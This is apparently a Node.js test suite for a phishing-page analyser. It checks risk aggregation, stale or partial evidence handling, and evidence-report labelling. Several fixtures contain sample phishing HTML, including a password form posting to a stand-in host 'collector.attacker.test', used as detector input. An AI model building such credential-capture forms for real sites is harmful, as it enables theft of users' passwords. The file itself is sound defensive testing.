import test from 'node:test';
import assert from 'node:assert/strict';
import { OverallRiskAggregator } from '../core/rules/risk_aggregator.js';
import { buildEvidenceReport } from '../core/evidence_report.js';
import { assessContentSignals, hasCompleteRenderedEvidence, recordContentEvidence } from '../core/rules/content_signal_assessor.js';
import { PageStructureExtractor } from '../core/investigators/page_extractor.js';

const completePage = { status: 'COMPLETED', fullRenderedInspection: true, riskLevel: 'LOW', verdict: null };

test('render completion recognizes the extractor SUCCESS contract and rejects screenshot-only or partial evidence', () => {
  const base = { inspectionMode: 'ISOLATED_LIVE', isHttpSuccess: true,
    liveInspection: { status: 'SUCCESS', renderStatus: 'RENDER_COMPLETE' },
    pageExtraction: { status: 'SUCCESS', forms: [], scripts: [], domNodes: 1 } };
  assert.equal(hasCompleteRenderedEvidence(base), true);
  assert.equal(hasCompleteRenderedEvidence({ ...base, liveInspection: { ...base.liveInspection, renderStatus: 'RENDER_PARTIAL' } }), false);
  assert.equal(hasCompleteRenderedEvidence({ ...base, pageExtraction: null }), false);
  assert.equal(hasCompleteRenderedEvidence({ ...base, isAccessRestricted: true }), false);
  assert.equal(hasCompleteRenderedEvidence({ ...base, now: 100_000, maxEvidenceAgeMs: 1000,
    pageExtraction: { status: 'SUCCESS', capturedAt: 1 } }), false);
});

test('access denied and incomplete live inspection remain inconclusive', () => {
  const denied = OverallRiskAggregator.aggregate({
    urlAssessment: { ruleScore: 0, classification: 'SAFE' },
    pageContentAssessment: { status: 'CONTENT_UNAVAILABLE', accessStatus: 'BLOCKED_HTTP_403', riskLevel: 'NOT_RUN' },
    inspectionMode: 'ISOLATED_LIVE'
  });
  assert.equal(denied.finalVerdict, 'UNDER_REVIEW');
  assert.equal(denied.outcome, 'UNVERIFIED');
  assert.equal(denied.verifiedThreat, false);
  assert.equal(denied.verdictBasis, 'ACCESS_RESTRICTED');
  const incomplete = OverallRiskAggregator.aggregate({
    urlAssessment: { ruleScore: 0, classification: 'SAFE' },
    pageContentAssessment: { status: 'NOT_RUN', riskLevel: 'NOT_RUN' },
    inspectionMode: 'ISOLATED_LIVE'
  });
  assert.equal(incomplete.finalVerdict, 'UNDER_REVIEW');
  assert.equal(incomplete.outcome, 'UNVERIFIED');
});

test('URL-only and URL model predictions cannot produce a verified safe or threat finding', () => {
  const urlOnly = OverallRiskAggregator.aggregate({ urlAssessment: { ruleScore: 0, classification: 'SAFE' } });
  assert.equal(urlOnly.finalVerdict, 'UNDER_REVIEW');
  assert.equal(urlOnly.outcome, 'UNVERIFIED');
  assert.equal(urlOnly.verifiedThreat, false);
  const prediction = OverallRiskAggregator.aggregate({
    urlAssessment: { ruleScore: 0, classification: 'SAFE' },
    modelPrediction: 'PHISHING', modelProbability: 0.91,
    pageContentAssessment: { status: 'NOT_RUN', riskLevel: 'NOT_RUN' }
  });
  assert.equal(prediction.finalVerdict, 'UNDER_REVIEW');
  assert.equal(prediction.outcome, 'SUSPICIOUS');
  assert.equal(prediction.verdictBasis, 'MODEL_PREDICTION');
  assert.match(prediction.summary, /prediction, not verified page evidence/);
});

test('completed checks with no indicators do not issue a universal SAFE verdict', () => {
  const result = OverallRiskAggregator.aggregate({
    urlAssessment: { ruleScore: 0, classification: 'SAFE' },
    pageContentAssessment: { ...completePage }
  });
  assert.equal(result.finalVerdict, 'NO_THREAT_OBSERVED');
  assert.equal(result.outcome, 'NO_THREAT_DETECTED');
  assert.match(result.summary, /not a universal safety guarantee/);
  assert.equal(result.verifiedThreat, false);
});

test('unverified page verdict and weak benign signals cannot establish malicious behavior', () => {
  const result = OverallRiskAggregator.aggregate({
    urlAssessment: { ruleScore: 0, classification: 'SAFE' },
    modelPrediction: 'LEGITIMATE',
    pageContentAssessment: { ...completePage, riskLevel: 'CRITICAL', verdict: 'PHISHING', signals: [], summary: 'Uncorroborated page label.' }
  });
  assert.equal(result.outcome, 'SUSPICIOUS');
  assert.equal(result.finalVerdict, 'UNDER_REVIEW');
  assert.equal(result.verifiedThreat, false);
});

test('two independent current high-confidence observed groups can establish malicious outcome', () => {
  const result = OverallRiskAggregator.aggregate({
    urlAssessment: { ruleScore: 0, classification: 'SAFE' }, modelPrediction: 'LEGITIMATE',
    now: 1200,
    pageContentAssessment: { ...completePage, verifiedMaliciousEvidence: [
      { verified: true, provenance: 'OBSERVED', confidenceLevel: 'HIGH', group: 'credential_capture', observedAt: 1100 },
      { verified: true, provenance: 'OBSERVED', confidenceLevel: 'HIGH', group: 'brand_impersonation', observedAt: 1100 }
    ] }
  });
  assert.equal(result.outcome, 'MALICIOUS');
  assert.equal(result.finalVerdict, 'PHISHING');
  assert.equal(result.verifiedThreat, true);
  assert.equal(result.conflicts.length, 2);
});

test('stale or future verified evidence cannot establish a malicious outcome', () => {
  const verifiedMaliciousEvidence = [
    { verified: true, provenance: 'OBSERVED', confidenceLevel: 'HIGH', group: 'credential_capture', observedAt: 1 },
    { verified: true, provenance: 'OBSERVED', confidenceLevel: 'HIGH', group: 'brand_impersonation', observedAt: 5000 }
  ];
  const result = OverallRiskAggregator.aggregate({ urlAssessment: { classification: 'SAFE', ruleScore: 0 }, now: 1200,
    pageContentAssessment: { ...completePage, verifiedMaliciousEvidence } });
  assert.equal(result.outcome, 'UNVERIFIED');
  assert.equal(result.verifiedThreat, false);
  assert.equal(result.verdictBasis, 'EVIDENCE_INVALID');
});

test('heuristic URL phishing indicators are not marked verified', () => {
  const result = OverallRiskAggregator.aggregate({
    urlAssessment: { ruleScore: 78, classification: 'PHISHING' },
    pageContentAssessment: { status: 'NOT_RUN', riskLevel: 'NOT_RUN' },
    inspectionMode: 'ISOLATED_LIVE'
  });
  assert.equal(result.finalVerdict, 'UNDER_REVIEW');
  assert.equal(result.outcome, 'SUSPICIOUS');
  assert.equal(result.verdictBasis, 'URL_HEURISTIC');
  assert.equal(result.verifiedThreat, false);
});

const completedExtraction = overrides => ({ status: 'COMPLETED', forms: [], scripts: [], domNodes: 1, ...overrides });

test('clean-looking URL with phishing page indicators is suspicious, not safe', () => {
  const page = PageStructureExtractor.extract('<html><form action="https://collector.attacker.test/collect" method="post"><input name="password" type="password" value="must-not-be-captured"></form></html>', 'example.test');
  const content = assessContentSignals({ complete: true, targetUrl: 'https://example.test/login', finalUrl: 'https://example.test/login',
    pageExtraction: page, observedAt: 2000 });
  const overall = OverallRiskAggregator.aggregate({ urlAssessment: { classification: 'SAFE', ruleScore: 0 },
    modelPrediction: 'LEGITIMATE', pageContentAssessment: { ...completePage, ...content } });
  assert.equal(content.outcome, 'SUSPICIOUS');
  assert.equal(content.signals[0].code, 'SENSITIVE_FORM_CROSS_DOMAIN_DESTINATION');
  assert.equal(content.signals[0].kind, 'HEURISTIC');
  assert.equal(content.signals[0].provenance, 'INFERRED');
  assert.ok(content.signals[0].observationRefs.some(id => content.observations.find(item => item.id === id)?.ref === 'dom.forms[0]'));
  assert.ok(content.observations.some(item => item.ref === 'dom.forms[0].inputs[0]'));
  assert.equal(JSON.stringify(content).includes('must-not-be-captured'), false);
  assert.equal(overall.outcome, 'SUSPICIOUS');
  assert.equal(overall.verifiedThreat, false);
});

test('legitimate same-origin login form is not itself a phishing indicator', () => {
  const page = PageStructureExtractor.extract('<html><form action="/session" method="post"><input name="password" type="password"></form></html>', 'bank.example');
  const content = assessContentSignals({ complete: true, targetUrl: 'https://bank.example/login', finalUrl: 'https://bank.example/login',
    pageExtraction: page, observedAt: 2000 });
  assert.equal(content.outcome, 'NO_THREAT_DETECTED');
  assert.deepEqual(content.signals, []);
  assert.ok(content.observations.some(item => item.code === 'SENSITIVE_INPUT_TYPE_OR_LABEL'));
});

test('suspicious destination and cross-origin signals remain heuristic and grouped', () => {
  const content = assessContentSignals({ complete: true, targetUrl: 'https://example.test/login', finalUrl: 'https://example.test/login',
    pageExtraction: completedExtraction({ forms: [{ action: 'https://collector.other.test/collect', isExternal: true, hasPassword: false }], scripts: [{ src: 'https://cdn.other.test/app.js', isExternal: true }] }), observedAt: 2000 });
  assert.equal(content.outcome, 'SUSPICIOUS');
  assert.equal(new Set(content.signals.map(signal => signal.group)).size, 2);
  assert.ok(content.signals.every(signal => signal.kind === 'HEURISTIC'));
});

test('visual social-engineering clues are indicators and do not alone establish a threat', () => {
  const content = assessContentSignals({ complete: true, targetUrl: 'https://example.test', finalUrl: 'https://example.test',
    pageExtraction: completedExtraction({}),
    visualFindings: [{ category: 'SOCIAL_ENGINEERING', confidence: 98 }, { category: 'SOCIAL_ENGINEERING', confidence: 90 }],
    observedAt: 2000 });
  assert.equal(content.outcome, 'SUSPICIOUS');
  assert.equal(content.signals.length, 1, 'correlated visual findings collapse to one group signal');
  assert.equal(content.signals[0].kind, 'HEURISTIC');
  assert.equal(content.signals[0].confidenceLevel, 'LOW');
});

test('failed, timed-out, and partial content fetches remain unverified', () => {
  for (const page of [
    { status: 'CONTENT_UNAVAILABLE', accessStatus: 'BLOCKED_HTTP_403', riskLevel: 'NOT_RUN' },
    { status: 'TIMEOUT', riskLevel: 'NOT_RUN' },
    { status: 'PARTIAL', fullRenderedInspection: false, riskLevel: 'NOT_RUN' }
  ]) {
    const result = OverallRiskAggregator.aggregate({ urlAssessment: { classification: 'SAFE', ruleScore: 0 },
      pageContentAssessment: page, inspectionMode: 'ISOLATED_LIVE' });
    assert.equal(result.outcome, 'UNVERIFIED');
  }
  for (const status of ['FAILED', 'TIMEOUT']) {
    const assessment = assessContentSignals({ complete: false, pageExtraction: completedExtraction({}) });
    assert.equal(assessment.outcome, 'UNVERIFIED', status);
  }
});

test('contradictory model and page indicators retain uncertainty and conflict', () => {
  const content = assessContentSignals({ complete: true, targetUrl: 'https://example.test', finalUrl: 'https://example.test',
    pageExtraction: completedExtraction({ forms: [{ action: 'https://collector.other.test/collect', isExternal: true }] }), observedAt: 2000 });
  const result = OverallRiskAggregator.aggregate({ urlAssessment: { classification: 'SAFE', ruleScore: 0 }, modelPrediction: 'LEGITIMATE',
    pageContentAssessment: { ...completePage, ...content } });
  assert.equal(result.outcome, 'SUSPICIOUS');
  assert.ok(result.conflicts.some(conflict => conflict.includes('LEGITIMATE')));
});

test('cross-origin form configuration is detected from extracted action even when registrable-domain heuristic is false', () => {
  const page = PageStructureExtractor.extract('<form action="https://auth.example.com/login"><input type="password" name="password"></form>', 'www.example.com');
  assert.equal(page.forms[0].isExternal, false, 'the existing extractor compares registrable domains, not origins');
  const content = assessContentSignals({ complete: true, targetUrl: 'https://www.example.test/login', finalUrl: 'https://www.example.test/login', pageExtraction: page });
  assert.equal(content.outcome, 'SUSPICIOUS');
  assert.equal(content.signals[0].code, 'SENSITIVE_FORM_CROSS_DOMAIN_DESTINATION');
  assert.equal(content.observations.find(item => item.ref === 'dom.forms[0]')?.details.crossOrigin, true);
});

test('failed and malformed DOM extraction cannot produce a clean content outcome', () => {
  for (const extraction of [null, { status: 'FAILED', forms: [] }, { status: 'NOT_AVAILABLE', forms: [] },
    { status: 'COMPLETED', forms: [], domNodes: 1 }, { status: 'COMPLETED', forms: [], scripts: [], domNodes: 0 },
    { status: 'COMPLETED', forms: [], scripts: [], domNodes: 1, capturedAt: 'invalid-time' }]) {
    const result = assessContentSignals({ complete: true, pageExtraction: extraction });
    assert.equal(result.outcome, 'UNVERIFIED');
    assert.equal(result.observations.length, 0);
  }
});

test('stale network and redirect observations are excluded and duplicate requests do not add independent groups', () => {
  const now = 10 * 24 * 60 * 60 * 1000;
  const stale = now - 25 * 60 * 60 * 1000;
  const result = assessContentSignals({ complete: true, observedAt: now, targetUrl: 'https://example.test/', finalUrl: 'https://example.test/',
    pageExtraction: completedExtraction({}),
    networkEvents: [{ url: 'https://cdn.example.test/a.js', timestamp: stale }, { url: 'https://cdn.example.test/a.js', timestamp: stale }],
    redirectChain: [{ fromUrl: 'https://example.test/', toUrl: 'https://other.test/', timestamp: stale }] });
  assert.equal(result.outcome, 'NO_THREAT_DETECTED');
  assert.deepEqual(result.signals, []);

  const duplicate = assessContentSignals({ complete: true, observedAt: now, targetUrl: 'https://example.test/', finalUrl: 'https://example.test/',
    pageExtraction: completedExtraction({}),
    networkEvents: [{ url: 'https://cdn.example.test/a.js' }, { url: 'https://cdn.example.test/a.js' }] });
  assert.equal(duplicate.signals.length, 1);
  assert.equal(new Set(duplicate.signals.map(signal => signal.group)).size, 1);
});

test('stale extracted DOM cannot be promoted to a current no-threat assessment', () => {
  const now = 10 * 24 * 60 * 60 * 1000;
  const result = assessContentSignals({ complete: true, observedAt: now, targetUrl: 'https://example.test/',
    pageExtraction: completedExtraction({ capturedAt: now - 25 * 60 * 60 * 1000 }) });
  assert.equal(result.outcome, 'UNVERIFIED');
  assert.equal(result.riskLevel, 'NOT_RUN');
});

test('redirect, blocked mutation, identity, and purpose indicators retain their actual source references', () => {
  const content = assessContentSignals({ complete: true, observedAt: 5000, targetUrl: 'https://brand.example.test/',
    finalUrl: 'http://lookalike.example.test/', pageExtraction: completedExtraction({}),
    redirectChain: [{ fromUrl: 'https://brand.example.test/', toUrl: 'http://lookalike.example.test/', status: 302, timestamp: 4900 }],
    blockedRequests: [{ method: 'POST', timestamp: 4901 }], identityMismatch: true, purposeMismatch: true });
  assert.equal(content.outcome, 'SUSPICIOUS');
  assert.ok(content.signals.some(signal => signal.code === 'HTTPS_TO_HTTP_REDIRECT' && signal.observationRefs.length));
  assert.ok(content.signals.some(signal => signal.code === 'BLOCKED_MUTATING_PAGE_REQUEST' && signal.observationRefs.length));
  assert.ok(content.signals.some(signal => signal.code === 'IDENTITY_CONTINUITY_MISMATCH' && signal.sourceReferences[0].source === 'IDENTITY_ANALYSIS'));
  assert.ok(content.signals.some(signal => signal.code === 'PAGE_PURPOSE_MISMATCH' && signal.sourceReferences[0].source === 'PAGE_INTENT'));
});

test('content evidence ledger links inferred findings to observed facts without conflating provenance', () => {
  const page = PageStructureExtractor.extract('<form action="https://other.test/collect"><input type="password" name="password"></form>', 'example.test');
  const assessment = assessContentSignals({ complete: true, targetUrl: 'https://example.test/', finalUrl: 'https://example.test/', pageExtraction: page, observedAt: 2000 });
  const ledger = [];
  recordContentEvidence(assessment, (type, category, title, detail, data) => {
    const item = { id: `E-${ledger.length + 1}`, type, category, title, detail, data };
    ledger.push(item);
    return item;
  });
  const fact = ledger.find(item => item.data.factCode === 'FORM_CONFIGURATION');
  const finding = ledger.find(item => item.data.reasonCode === 'SENSITIVE_FORM_CROSS_DOMAIN_DESTINATION');
  assert.equal(fact.type, 'OBSERVED');
  assert.equal(finding.type, 'INFERRED');
  assert.ok(finding.data.evidenceRefs.includes(fact.id));
  assert.equal(finding.data.kind, 'HEURISTIC');
});

test('structured report labels source, timestamps, scope, unsupported categories and stale evidence', () => {
  const schema = {
    id: 'TL-2026-1031-1200-ABC', status: 'COMPLETED', createdAt: 1000, accessStatus: 'ACCESSIBLE',
    inspectionMode: 'ISOLATED_LIVE', renderStatus: 'RENDER_COMPLETE',
    pageContentAssessment: { status: 'COMPLETED', fullRenderedInspection: true },
    overallAssessment: { finalVerdict: 'PHISHING', headline: 'Observed phishing behavior', finalRiskLevel: 'CRITICAL', verdictBasis: 'OBSERVED_PAGE_BEHAVIOR', verifiedThreat: true, reasons: ['Credential exfiltration observed.'], conflicts: [] },
    assessment: { reasons: ['Credential exfiltration observed.'], limitations: [], missing_evidence: [] },
    modelResult: { prediction: 'LEGITIMATE', probabilityPhishing: 0.04 },
    evidence: [
      { id: 'E-1', type: 'OBSERVED', category: 'page', title: 'Credential exfiltration observed', detail: 'Credential exfiltration observed.', ts: 1100 },
      { id: 'E-2', type: 'OBSERVED', category: 'page', title: 'Old item', detail: 'stale', ts: 900 }
    ]
  };
  const report = buildEvidenceReport(schema, 1200);
  assert.equal(report.verdict.scope, 'RENDERED_PAGE');
  assert.equal(report.verdict.verifiedThreat, true);
  assert.deepEqual(report.reasons[0].evidenceRefs, ['E-1']);
  assert.equal(report.evidence[1].freshness, 'STALE');
  assert.equal(report.categories.malware.status, 'NOT_ASSESSED');
  assert.equal(report.categories.scam.status, 'NOT_ASSESSED');
  assert.match(report.inspection.limitations.join(' '), /not treated as current support/);
});

test('missing evidence prevents a report from presenting an aggregate threat as verified fact', () => {
  const report = buildEvidenceReport({
    id: 'case-empty', status: 'COMPLETED', createdAt: 1000, inspectionMode: 'ISOLATED_LIVE', accessStatus: 'ACCESSIBLE',
    pageContentAssessment: { status: 'COMPLETED', fullRenderedInspection: true },
    overallAssessment: { finalVerdict: 'PHISHING', verifiedThreat: true, verdictBasis: 'OBSERVED_PAGE_BEHAVIOR' },
    assessment: {}, evidence: []
  }, 1200);
  assert.equal(report.verdict.verifiedThreat, false);
  assert.equal(report.verdict.outcome, 'SUSPICIOUS');
  assert.equal(report.categories.phishing.status, 'INDICATORS_ONLY');
});

test('evidence report exposes canonical outcome and content signal provenance', () => {
  const report = buildEvidenceReport({
    id: 'case-content', status: 'COMPLETED', createdAt: 1000, inspectionMode: 'ISOLATED_LIVE', accessStatus: 'ACCESSIBLE',
    pageContentAssessment: { status: 'COMPLETED', fullRenderedInspection: true },
    overallAssessment: { outcome: 'SUSPICIOUS', finalVerdict: 'UNDER_REVIEW', finalRiskLevel: 'MODERATE',
      verdictBasis: 'CONTENT_INDICATORS', confidenceLevel: 'LOW',
      reasons: ['Content indicators warrant caution.'], reasonCodes: ['CROSS_DOMAIN_FORM_DESTINATION'],
      findings: [{ code: 'CROSS_DOMAIN_FORM_DESTINATION', group: 'form_destination', source: 'LIVE_DOM', kind: 'HEURISTIC',
        observedAt: 1100, confidenceLevel: 'LOW', description: 'A form points elsewhere.', evidenceId: 'E-1', evidenceRefs: ['E-2'] }] },
    assessment: {}, evidence: [
      { id: 'E-1', type: 'INFERRED', category: 'page', title: 'Cross-domain form', detail: 'A form points elsewhere.', ts: 1100 },
      { id: 'E-2', type: 'OBSERVED', category: 'page', title: 'Form destination observed', detail: 'Form action configured.', ts: 1100 }
    ]
  }, 1200);
  assert.equal(report.verdict.outcome, 'SUSPICIOUS');
  assert.equal(report.verdict.legacyValue, 'UNDER_REVIEW');
  assert.equal(report.reasons[0].kind, 'HEURISTIC');
  assert.equal(report.reasons[0].source, 'LIVE_DOM');
  assert.deepEqual(report.reasons[0].evidenceRefs, ['E-1', 'E-2']);
  assert.deepEqual(report.reasons[0].reasonCodes, ['CROSS_DOMAIN_FORM_DESTINATION']);
});

test('phishing, malware and scam remain separate report categories', () => {
  const report = buildEvidenceReport({ id: 'case-categories', status: 'INCOMPLETE', assessment: {}, evidence: [] }, 1200);
  assert.equal(report.categories.phishing.status, 'NO_CONFIRMED_THREAT');
  assert.equal(report.categories.malware.status, 'NOT_ASSESSED');
  assert.equal(report.categories.scam.status, 'NOT_ASSESSED');
  assert.equal(report.categories.deceptiveDownloads.status, 'NOT_ASSESSED');
  assert.equal(report.categories.piracyCopyright.status, 'NOT_ASSESSED');
});
